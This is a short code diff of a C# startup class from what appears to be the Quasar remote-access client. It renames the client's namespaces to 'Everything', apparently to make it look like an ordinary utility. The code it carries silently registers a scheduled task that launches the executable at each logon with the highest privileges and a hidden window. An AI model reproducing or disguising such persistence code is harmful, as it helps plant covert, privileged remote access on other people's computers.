@@ -1,9 +1,9 @@
-﻿using Microsoft.Win32;
-using Quasar.Client.Helper;
+﻿using Everything.Helper;
+using Microsoft.Win32;
 using Quasar.Common.Enums;
 using System.Diagnostics;
 
-namespace Quasar.Client.Setup
+namespace Everything.Setup
 {
     public class ClientStartup : ClientSetupBase
     {
@@ -13,14 +13,14 @@ namespace Quasar.Client.Setup
         {
             if (UserAccount.Type == AccountType.Admin)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                var startInfo = new ProcessStartInfo("schtasks")
                 {
                     Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath + "\" /rl HIGHEST /f",
                     UseShellExecute = false,
                     CreateNoWindow = true
                 };
 
-                Process p = Process.Start(startInfo);
+                var p = Process.Start(startInfo);
                 p.WaitForExit(1000);
 
                 startInfo = new ProcessStartInfo("sc")
@@ -44,14 +44,14 @@ namespace Quasar.Client.Setup
         {
             if (UserAccount.Type == AccountType.Admin)
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
+                var startInfo = new ProcessStartInfo("schtasks")
                 {
                     Arguments = "/delete /tn \"" + startupName + "\" /f",
                     UseShellExecute = false,
                     CreateNoWindow = true
                 };
 
-                Process p = Process.Start(startInfo);
+                var p = Process.Start(startInfo);
                 p.WaitForExit(1000);
 
                 startInfo = new ProcessStartInfo("sc")
